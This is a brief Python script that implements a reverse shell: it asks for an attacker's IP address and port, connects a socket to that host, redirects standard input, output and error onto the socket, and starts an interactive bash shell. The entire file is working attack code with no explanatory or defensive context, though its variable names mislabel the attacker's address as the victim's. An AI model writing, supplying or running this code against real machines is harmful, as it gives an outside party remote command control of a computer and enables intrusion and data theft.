import socket,subprocess,os

victim_ip=input("Enter Attacker Ip: ")
victim_port=int(input("Enter Attacker Port: "))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((victim_ip,victim_port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
